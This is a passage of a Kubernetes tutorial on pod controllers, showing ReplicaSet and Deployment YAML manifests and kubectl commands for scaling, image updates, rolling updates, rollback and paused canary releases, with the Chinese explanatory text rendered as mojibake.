kubectl get pods -n dev\npc-cronjob-1592587800-x4tsm   0/1     Completed   0          2m24s\npc-cronjob-1592587860-r5gv4   0/1     Completed   0          84s\npc-cronjob-1592587920-9dxxq   1/1     Running     0          24s\n\n\n# å é¤cronjob\n[root@k8s-master01 ~]# kubectl  delete -f pc-cronjob.yaml\ncronjob.batch "pc-cronjob" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',normalizedContent:'# pod æ§å¶å¨ä»ç»\n\npod æ¯ kubernetes çæå°ç®¡çååï¼å¨ kubernetes ä¸­ï¼æç§ pod çåå»ºæ¹å¼å¯ä»¥å°å¶åä¸ºä¸¤ç±»ï¼\n\n * èªä¸»å¼ podï¼kubernetes ç´æ¥åå»ºåºæ¥ç podï¼è¿ç§ pod å é¤åå°±æ²¡æäºï¼ä¹ä¸ä¼éå»º\n * æ§å¶å¨åå»ºç podï¼kubernetes éè¿æ§å¶å¨åå»ºç podï¼è¿ç§ pod å é¤äºä¹åè¿ä¼èªå¨éå»º\n\n> ä»ä¹æ¯podæ§å¶å¨\n> pod æ§å¶å¨æ¯ç®¡ç pod çä¸­é´å±ï¼ä½¿ç¨ pod æ§å¶å¨ä¹åï¼åªéè¦åè¯ pod æ§å¶å¨ï¼æ³è¦å¤å°ä¸ªä»ä¹æ ·ç pod å°±å¯ä»¥äºï¼å®ä¼åå»ºåºæ»¡è¶³æ¡ä»¶ç pod å¹¶ç¡®ä¿æ¯ä¸ä¸ª pod èµæºå¤äºç¨æ·ææçç®æ ç¶æãå¦æ pod èµæºå¨è¿è¡ä¸­åºç°æéï¼å®ä¼åºäºæå®ç­ç¥éæ°ç¼æ podã\n\nå¨ kubernetes ä¸­ï¼æå¾å¤ç±»åç pod æ§å¶å¨ï¼æ¯ç§é½æèªå·±çéåçåºæ¯ï¼å¸¸è§çæä¸é¢è¿äºï¼\n\n * replicationcontrollerï¼æ¯è¾åå§ç pod æ§å¶å¨ï¼å·²ç»è¢«åºå¼ï¼ç± replicaset æ¿ä»£\n * replicasetï¼ä¿è¯å¯æ¬æ°éä¸ç´ç»´æå¨ææå¼ï¼å¹¶æ¯æ pod æ°éæ©ç¼©å®¹ï¼éåçæ¬åçº§\n * deploymentï¼éè¿æ§å¶ replicaset æ¥æ§å¶ podï¼å¹¶æ¯ææ»å¨åçº§ãåéçæ¬\n * horizontal pod autoscalerï¼å¯ä»¥æ ¹æ®éç¾¤è´è½½èªå¨æ°´å¹³è°æ´ pod çæ°éï¼å®ç°åå³°å¡«è°·\n * daemonsetï¼å¨éç¾¤ä¸­çæå® node ä¸è¿è¡ä¸ä»è¿è¡ä¸ä¸ªå¯æ¬ï¼ä¸è¬ç¨äºå®æ¤è¿ç¨ç±»çä»»å¡\n * jobï¼å®åå»ºåºæ¥ç pod åªè¦å®æä»»å¡å°±ç«å³éåºï¼ä¸éè¦éå¯æéå»ºï¼ç¨äºæ§è¡ä¸æ¬¡æ§ä»»å¡\n * cronjobï¼å®åå»ºç pod è´è´£å¨ææ§ä»»å¡æ§å¶ï¼ä¸éè¦æç»­åå°è¿è¡\n * statefulsetï¼ç®¡çæç¶æåºç¨\n\n\n# replicaset(rs)\n\nreplicaset çä¸»è¦ä½ç¨æ¯ä¿è¯ä¸å®æ°éç pod æ­£å¸¸è¿è¡ï¼å®ä¼æç»­çå¬è¿äº pod çè¿è¡ç¶æï¼ä¸æ¦ pod åçæéï¼å°±ä¼éå¯æéå»ºãåæ¶å®è¿æ¯æå¯¹ pod æ°éçæ©ç¼©å®¹åéåçæ¬çåéçº§ã\n\n\n\nreplicaset çèµæºæ¸åæä»¶ï¼\n\napiversion: apps/v1 # çæ¬å·\nkind: replicaset # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: rs\nspec: # è¯¦ææè¿°\n  replicas: 3 # å¯æ¬æ°é\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchlabels:      # labelså¹éè§å\n      app: nginx-pod\n    matchexpressions: # expressionså¹éè§å\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¨è¿éé¢ï¼éè¦æ°äºè§£çéç½®é¡¹å°±æ¯ spec ä¸é¢å ä¸ªéé¡¹ï¼\n\n * replicasï¼æå®å¯æ¬æ°éï¼å¶å®å°±æ¯å½å rs åå»ºåºæ¥ç pod çæ°éï¼é»è®¤ä¸º 1\n * selectorï¼éæ©å¨ï¼å®çä½ç¨æ¯å»ºç« pod æ§å¶å¨å pod ä¹é´çå³èå³ç³»ï¼éç¨ç label selector æºå¶\n   å¨ pod æ¨¡æ¿ä¸å®ä¹ labelï¼å¨æ§å¶å¨ä¸å®ä¹éæ©å¨ï¼å°±å¯ä»¥è¡¨æå½åæ§å¶å¨è½ç®¡çåªäº pod äº\n * templateï¼æ¨¡æ¿ï¼å°±æ¯å½åæ§å¶å¨åå»º pod æä½¿ç¨çæ¨¡æ¿æ¿ï¼éé¢å¶å®å°±æ¯åä¸ç« å­¦è¿ç pod çå®ä¹\n\nåå»º replicaset\nåå»º pc-replicaset.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: replicaset   \nmetadata:\n  name: pc-replicaset\n  namespace: dev\nspec:\n  replicas: 3\n  selector: \n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºrs\n[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yaml\nreplicaset.apps/pc-replicaset created\n\n# æ¥çrs\n# desired:ææå¯æ¬æ°é  \n# current:å½åå¯æ¬æ°é  \n# ready:å·²ç»åå¤å¥½æä¾æå¡çå¯æ¬æ°é\n[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wide\nname          desired   current ready age   containers   images             selector\npc-replicaset 3         3       3     22s   nginx        nginx:1.17.1       app=nginx-pod\n\n# æ¥çå½åæ§å¶å¨åå»ºåºæ¥çpod\n# è¿éåç°æ§å¶å¨åå»ºåºæ¥çpodçåç§°æ¯å¨æ§å¶å¨åç§°åé¢æ¼æ¥äº-xxxxxéæºç \n[root@k8s-master01 ~]# kubectl get pod -n dev\nname                          ready   status    restarts   age\npc-replicaset-6vmvt   1/1     running   0          54s\npc-replicaset-fmb8f   1/1     running   0          54s\npc-replicaset-snrk2   1/1     running   0          54s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ©ç¼©å®¹\n\n# ç¼è¾rsçå¯æ¬æ°éï¼ä¿®æ¹spec:replicas: 6å³å¯\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                          ready   status    restarts   age\npc-replicaset-6vmvt   1/1     running   0          114m\npc-replicaset-cftnp   1/1     running   0          10s\npc-replicaset-fjlm6   1/1     running   0          10s\npc-replicaset-fmb8f   1/1     running   0          114m\npc-replicaset-s2whj   1/1     running   0          10s\npc-replicaset-snrk2   1/1     running   0          114m\n\n# å½ç¶ä¹å¯ä»¥ç´æ¥ä½¿ç¨å½ä»¤å®ç°\n# ä½¿ç¨scaleå½ä»¤å®ç°æ©ç¼©å®¹ï¼ åé¢--replicas=nç´æ¥æå®ç®æ æ°éå³å¯\n[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n dev\nreplicaset.apps/pc-replicaset scaled\n\n# å½ä»¤è¿è¡å®æ¯ï¼ç«å³æ¥çï¼åç°å·²ç»æ4ä¸ªå¼å§åå¤éåºäº\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                       ready   status        restarts   age\npc-replicaset-6vmvt   0/1     terminating   0          118m\npc-replicaset-cftnp   0/1     terminating   0          4m17s\npc-replicaset-fjlm6   0/1     terminating   0          4m17s\npc-replicaset-fmb8f   1/1     running       0          118m\npc-replicaset-s2whj   0/1     terminating   0          4m17s\npc-replicaset-snrk2   1/1     running       0          118m\n\n#ç¨ç­çå»ï¼å°±åªå©ä¸2ä¸ªäº\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                       ready   status    restarts   age\npc-replicaset-fmb8f   1/1     running   0          119m\npc-replicaset-snrk2   1/1     running   0          119m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\néååçº§\n\n# ç¼è¾rsçå®¹å¨éå - image: nginx:1.17.2\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# åæ¬¡æ¥çï¼åç°éåçæ¬å·²ç»åæ´äº\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                desired  current   ready   age    containers   images        ...\npc-replicaset       2        2         2       140m   nginx         nginx:1.17.2  ...\n\n# åæ ·çéçï¼ä¹å¯ä»¥ä½¿ç¨å½ä»¤å®æè¿ä¸ªå·¥ä½\n# kubectl set image rs rsåç§° å®¹å¨=éåçæ¬ -n namespace\n[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1  -n dev\nreplicaset.apps/pc-replicaset image updated\n\n# åæ¬¡æ¥çï¼åç°éåçæ¬å·²ç»åæ´äº\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                 desired  current   ready   age    containers   images            ...\npc-replicaset        2        2         2       145m   nginx        nginx:1.17.1 ... \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nå é¤ replicaset\n\n# ä½¿ç¨kubectl deleteå½ä»¤ä¼å é¤æ­¤rsä»¥åå®ç®¡ççpod\n# å¨kuberneteså é¤rsåï¼ä¼å°rsçreplicasclearè°æ´ä¸º0ï¼ç­å¾ææçpodè¢«å é¤åï¼å¨æ§è¡rså¯¹è±¡çå é¤\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pod -n dev -o wide\nno resources found in dev namespace.\n\n# å¦æå¸æä»ä»å é¤rså¯¹è±¡ï¼ä¿çpodï¼ï¼å¯ä»¥ä½¿ç¨kubectl deleteå½ä»¤æ¶æ·»å --cascade=falseéé¡¹ï¼ä¸æ¨èï¼ã\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=false\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                  ready   status    restarts   age\npc-replicaset-cl82j   1/1     running   0          75s\npc-replicaset-dslhb   1/1     running   0          75s\n\n# ä¹å¯ä»¥ä½¿ç¨yamlç´æ¥å é¤(æ¨è)\n[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yaml\nreplicaset.apps "pc-replicaset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# deployment(deploy)\n\nä¸ºäºæ´å¥½çè§£å³æå¡ç¼æçé®é¢ï¼kubernetes å¨ v1.2 çæ¬å¼å§ï¼å¼å¥äº deployment æ§å¶å¨ãå¼å¾ä¸æçæ¯ï¼è¿ç§æ§å¶å¨å¹¶ä¸ç´æ¥ç®¡ç podï¼èæ¯éè¿ç®¡ç replicaset æ¥ç®ä»ç®¡ç podï¼å³ï¼deployment ç®¡ç replicasetï¼replicaset ç®¡ç podãæä»¥ deployment æ¯ replicaset åè½æ´å å¼ºå¤§ã\n\n\n\ndeployment ä¸»è¦åè½æä¸é¢å ä¸ªï¼\n\n * æ¯æ replicaset çææåè½\n * æ¯æåå¸çåæ­¢ãç»§ç»­\n * æ¯ææ»å¨æ´æ°ååæ»çæ¬\n\ndeployment çèµæºæ¸åæä»¶ï¼\n\napiversion: apps/v1 # çæ¬å·\nkind: deployment # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: deploy\nspec: # è¯¦ææè¿°\n  replicas: 3 # å¯æ¬æ°é\n  revisionhistorylimit: 3 # ä¿çåå²çæ¬\n  paused: false # æåé¨ç½²ï¼é»è®¤æ¯false\n  progressdeadlineseconds: 600 # é¨ç½²è¶æ¶æ¶é´ï¼sï¼ï¼é»è®¤æ¯600\n  strategy: # ç­ç¥\n    type: rollingupdate # æ»å¨æ´æ°ç­ç¥\n    rollingupdate: # æ»å¨æ´æ°\n      maxsurge: 30% # æå¤§é¢å¤å¯ä»¥å­å¨çå¯æ¬æ°ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n      maxunavailable: 30% # æå¤§ä¸å¯ç¨ç¶æç pod çæå¤§å¼ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchlabels:      # labelså¹éè§å\n      app: nginx-pod\n    matchexpressions: # expressionså¹éè§å\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\nåå»º deployment\nåå»º pc-deployment.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºdeployment\n[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=true\ndeployment.apps/pc-deployment created\n\n# æ¥çdeployment\n# up-to-date ææ°çæ¬çpodçæ°é\n# available  å½åå¯ç¨çpodçæ°é\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nname            ready   up-to-date   available   age\npc-deployment   3/3     3            3           15s\n\n# æ¥çrs\n# åç°rsçåç§°æ¯å¨åæ¥deploymentçåå­åé¢æ·»å äºä¸ä¸ª10ä½æ°çéæºä¸²\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   3         3         3       23s\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          107s\npc-deployment-6696798b78-smpvp   1/1     running   0          107s\npc-deployment-6696798b78-wvjd8   1/1     running   0          107s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\næ©ç¼©å®¹\n\n# åæ´å¯æ¬æ°éä¸º5ä¸ª\n[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5  -n dev\ndeployment.apps/pc-deployment scaled\n\n# æ¥çdeployment\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nname            ready   up-to-date   available   age\npc-deployment   5/5     5            5           2m\n\n# æ¥çpod\n[root@k8s-master01 ~]#  kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          4m19s\npc-deployment-6696798b78-jxmdq   1/1     running   0          94s\npc-deployment-6696798b78-mktqv   1/1     running   0          93s\npc-deployment-6696798b78-smpvp   1/1     running   0          4m19s\npc-deployment-6696798b78-wvjd8   1/1     running   0          4m19s\n\n# ç¼è¾deploymentçå¯æ¬æ°éï¼ä¿®æ¹spec:replicas: 4å³å¯\n[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n dev\ndeployment.apps/pc-deployment edited\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          5m23s\npc-deployment-6696798b78-jxmdq   1/1     running   0          2m38s\npc-deployment-6696798b78-smpvp   1/1     running   0          5m23s\npc-deployment-6696798b78-wvjd8   1/1     running   0          5m23s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\néåæ´æ°\ndeployment æ¯æä¸¤ç§æ´æ°ç­ç¥: éå»ºæ´æ°ï¼å æææèçæ¬å¾podï¼ç¶åéå»ºæ°çæ¬çpodï¼ å æ»å¨æ´æ°ï¼é»è®¤ï¼ï¼ä¸ä¼ä¸æ¬¡æ§å é¤ï¼åå ä¸é¨åä½çæ¬ï¼å»ºç«ä¸é¨åæ°çæ¬ï¼ä»¥æ­¤ç±»æ¨ï¼ç´å°æ»¡è¶³æ°éï¼ , å¯ä»¥éè¿ strategy æå®ç­ç¥ç±»åï¼æ¯æä¸¤ä¸ªå±æ§:\n\nstrategyï¼æå®æ°çpodæ¿æ¢æ§çpodçç­ç¥ï¼ æ¯æä¸¤ä¸ªå±æ§ï¼\n  typeï¼æå®ç­ç¥ç±»åï¼æ¯æä¸¤ç§ç­ç¥\n    recreateï¼å¨åå»ºåºæ°çpodä¹åä¼åææææå·²å­å¨çpod\n    rollingupdateï¼æ»å¨æ´æ°ï¼å°±æ¯ææ­»ä¸é¨åï¼å°±å¯å¨ä¸é¨åï¼å¨æ´æ°è¿ç¨ä¸­ï¼å­å¨ä¸¤ä¸ªçæ¬pod\n  rollingupdateï¼å½typeä¸ºrollingupdateæ¶çæï¼ç¨äºä¸ºrollingupdateè®¾ç½®åæ°ï¼æ¯æä¸¤ä¸ªå±æ§ï¼\n    maxunavailableï¼ç¨æ¥æå®å¨åçº§è¿ç¨ä¸­ä¸å¯ç¨podçæå¤§æ°éï¼é»è®¤ä¸º25%ã\n    maxsurgeï¼ ç¨æ¥æå®å¨åçº§è¿ç¨ä¸­å¯ä»¥è¶è¿ææçpodçæå¤§æ°éï¼é»è®¤ä¸º25%ã\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\néå»ºæ´æ°\n1. ç¼è¾ pc-deployment.yaml, å¨ spec èç¹ä¸æ·»å æ´æ°ç­ç¥\n\nspec:\n  strategy: # ç­ç¥\n    type: recreate # éå»ºæ´æ°\n\n\n1\n2\n3\n\n\n2. åå»º deploy è¿è¡éªè¯\n\n# åæ´éå\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n dev\ndeployment.apps/pc-deployment image updated\n\n# è§å¯åçº§è¿ç¨\n[root@k8s-master01 ~]#  kubectl get pods -n dev -w\nname                             ready   status    restarts   age\npc-deployment-5d89bdfbf9-65qcw   1/1     running   0          31s\npc-deployment-5d89bdfbf9-w5nzv   1/1     running   0          31s\npc-deployment-5d89bdfbf9-xpt7w   1/1     running   0          31s\n\npc-deployment-5d89bdfbf9-xpt7w   1/1     terminating   0          41s\npc-deployment-5d89bdfbf9-65qcw   1/1     terminating   0          41s\npc-deployment-5d89bdfbf9-w5nzv   1/1     terminating   0          41s\n\npc-deployment-675d469f8b-grn8z   0/1     pending       0          0s\npc-deployment-675d469f8b-hbl4v   0/1     pending       0          0s\npc-deployment-675d469f8b-67nz2   0/1     pending       0          0s\n\npc-deployment-675d469f8b-grn8z   0/1     containercreating   0          0s\npc-deployment-675d469f8b-hbl4v   0/1     containercreating   0          0s\npc-deployment-675d469f8b-67nz2   0/1     containercreating   0          0s\n\npc-deployment-675d469f8b-grn8z   1/1     running             0          1s\npc-deployment-675d469f8b-67nz2   1/1     running             0          1s\npc-deployment-675d469f8b-hbl4v   1/1     running             0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\næ»å¨æ´æ°\n1. ç¼è¾ pc-deployment.yaml, å¨ spec èç¹ä¸æ·»å æ´æ°ç­ç¥\n\nspec:\n  strategy: # ç­ç¥\n    type: rollingupdate # æ»å¨æ´æ°ç­ç¥\n    rollingupdate:\n      maxsurge: 25% \n      maxunavailable: 25%\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. åå»º deploy è¿è¡éªè¯\n\n# åæ´éå\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev \ndeployment.apps/pc-deployment image updated\n\n# è§å¯åçº§è¿ç¨\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname                           ready   status    restarts   age\npc-deployment-c848d767-8rbzt   1/1     running   0          31m\npc-deployment-c848d767-h4p68   1/1     running   0          31m\npc-deployment-c848d767-hlmz4   1/1     running   0          31m\npc-deployment-c848d767-rrqcn   1/1     running   0          31m\n\npc-deployment-966bf7f44-226rx   0/1     pending             0          0s\npc-deployment-966bf7f44-226rx   0/1     containercreating   0          0s\npc-deployment-966bf7f44-226rx   1/1     running             0          1s\npc-deployment-c848d767-h4p68    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-cnd44   0/1     pending             0          0s\npc-deployment-966bf7f44-cnd44   0/1     containercreating   0          0s\npc-deployment-966bf7f44-cnd44   1/1     running             0          2s\npc-deployment-c848d767-hlmz4    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-px48p   0/1     pending             0          0s\npc-deployment-966bf7f44-px48p   0/1     containercreating   0          0s\npc-deployment-966bf7f44-px48p   1/1     running             0          0s\npc-deployment-c848d767-8rbzt    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-dkmqp   0/1     pending             0          0s\npc-deployment-966bf7f44-dkmqp   0/1     containercreating   0          0s\npc-deployment-966bf7f44-dkmqp   1/1     running             0          2s\npc-deployment-c848d767-rrqcn    0/1     terminating         0          34m\n\n# è³æ­¤ï¼æ°çæ¬çpodåå»ºå®æ¯ï¼å°±çæ¬çpodéæ¯å®æ¯\n# ä¸­é´è¿ç¨æ¯æ»å¨è¿è¡çï¼ä¹å°±æ¯è¾¹éæ¯è¾¹åå»º\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\næ»å¨æ´æ°çè¿ç¨ï¼\n\n\n\néåæ´æ°ä¸­ rs çååï¼å¯ä»¥å¨åå»ºéåå¾æ¶åå  --recode åæ°ï¼æå©äºè®°å½åå»ºè¿ç¨ç­ã\n\n# æ¥çrs,åç°åæ¥çrsçä¾æ§å­å¨ï¼åªæ¯podæ°éåä¸ºäº0ï¼èååæ°äº§çäºä¸ä¸ªrsï¼podæ°éä¸º4\n# å¶å®è¿å°±æ¯deploymentè½å¤è¿è¡çæ¬åéçå¥¥å¦æå¨ï¼åé¢ä¼è¯¦ç»è§£é\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   0         0         0       7m37s\npc-deployment-6696798b11   0         0         0       5m37s\npc-deployment-c848d76789   4         4         4       72s\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nçæ¬åé\ndeployment æ¯æçæ¬åçº§è¿ç¨ä¸­çæåãç»§ç»­åè½ä»¥åçæ¬åéç­è¯¸å¤åè½ï¼ä¸é¢å·ä½æ¥ç.\n\nkubectl rolloutï¼ çæ¬åçº§ç¸å³åè½ï¼æ¯æä¸é¢çéé¡¹ï¼\n\n * status æ¾ç¤ºå½ååçº§ç¶æ\n * history æ¾ç¤º åçº§åå²è®°å½\n * pause æåçæ¬åçº§è¿ç¨\n * resume ç»§ç»­å·²ç»æåççæ¬åçº§è¿ç¨\n * restart éå¯çæ¬åçº§è¿ç¨\n * undo åæ»å°ä¸ä¸çº§çæ¬ï¼å¯ä»¥ä½¿ç¨ --to-revision åæ»å°æå®çæ¬ï¼\n\n# æ¥çå½ååçº§çæ¬çç¶æ\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev\ndeployment "pc-deployment" successfully rolled out\n\n# æ¥çåçº§åå²è®°å½\n[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n dev\ndeployment.apps/pc-deployment\nrevision  change-cause\n1         kubectl create --filename=pc-deployment.yaml --record=true\n2         kubectl create --filename=pc-deployment.yaml --record=true\n3         kubectl create --filename=pc-deployment.yaml --record=true\n# å¯ä»¥åç°æä¸æ¬¡çæ¬è®°å½ï¼è¯´æå®æè¿ä¸¤æ¬¡åçº§\n\n# çæ¬åæ»\n# è¿éç´æ¥ä½¿ç¨--to-revision=1åæ»å°äº1çæ¬ï¼ å¦æçç¥è¿ä¸ªéé¡¹ï¼å°±æ¯åéå°ä¸ä¸ªçæ¬ï¼å°±æ¯2çæ¬\n[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n dev\ndeployment.apps/pc-deployment rolled back\n\n# æ¥çåç°ï¼éè¿nginxéåçæ¬å¯ä»¥åç°å°äºç¬¬ä¸ç\n[root@k8s-master01 ~]# kubectl get deploy -n dev -o wide\nname            ready   up-to-date   available   age   containers   images         \npc-deployment   4/4     4            4           74m   nginx        nginx:1.17.1   \n\n# æ¥çrsï¼åç°ç¬¬ä¸ä¸ªrsä¸­æ4ä¸ªpodè¿è¡ï¼åé¢ä¸¤ä¸ªçæ¬çrsä¸­podä¸ºè¿è¡\n# å¶å®deploymentä¹æä»¥å¯æ¯å®ç°çæ¬çåæ»ï¼å°±æ¯éè¿è®°å½ä¸åå²rsæ¥å®ç°çï¼\n# ä¸æ¦æ³åæ»å°åªä¸ªçæ¬ï¼åªéè¦å°å½åçæ¬podæ°ééä¸º0ï¼ç¶åå°åæ»çæ¬çpodæåä¸ºç®æ æ°éå°±å¯ä»¥äº\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   4         4         4       78m\npc-deployment-966bf7f44    0         0         0       37m\npc-deployment-c848d767     0         0         0       71m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\néä¸éåå¸\ndeployment æ§å¶å¨æ¯ææ§å¶æ´æ°è¿ç¨ä¸­çæ§å¶ï¼å¦ âæå (pause)â æ âç»§ç»­ (resume)â æ´æ°æä½ã\n\næ¯å¦æä¸æ¹æ°ç pod èµæºåå»ºå®æåç«å³æåæ´æ°è¿ç¨ï¼æ­¤æ¶ï¼ä»å­å¨ä¸é¨åæ°çæ¬çåºç¨ï¼ä¸»ä½é¨åè¿æ¯æ§ççæ¬ãç¶åï¼åç­éä¸å°é¨åçç¨æ·è¯·æ±è·¯ç±å°æ°çæ¬ç pod åºç¨ï¼ç»§ç»­è§å¯è½å¦ç¨³å®å°æææçæ¹å¼è¿è¡ãç¡®å®æ²¡é®é¢ä¹ååç»§ç»­å®æä½ä¸ç pod èµæºæ»å¨æ´æ°ï¼å¦åç«å³åæ»æ´æ°æä½ãè¿å°±æ¯æè°çéä¸éåå¸ã\n\n# æ´æ°deploymentççæ¬ï¼å¹¶éç½®æådeployment\n[root@k8s-master01 ~]#  kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev && kubectl rollout pause deployment pc-deployment  -n dev\ndeployment.apps/pc-deployment image updated\ndeployment.apps/pc-deployment paused\n\n#è§å¯æ´æ°ç¶æ\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n devã\nwaiting for deployment "pc-deployment" rollout to finish: 2 out of 4 new replicas have been updated...\n\n# çæ§æ´æ°çè¿ç¨ï¼å¯ä»¥çå°å·²ç»æ°å¢äºä¸ä¸ªèµæºï¼ä½æ¯å¹¶æªæç§é¢æçç¶æå»å é¤ä¸ä¸ªæ§çèµæºï¼å°±æ¯å ä¸ºä½¿ç¨äºpauseæåå½ä»¤\n\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                       desired   current   ready   age     containers   images         \npc-deployment-5d89bdfbf9   3         3         3       19m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       14m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   2         2         2       3m16s   nginx        nginx:1.17.4   \n[root@k8s-master01 ~]# kubectl get pods 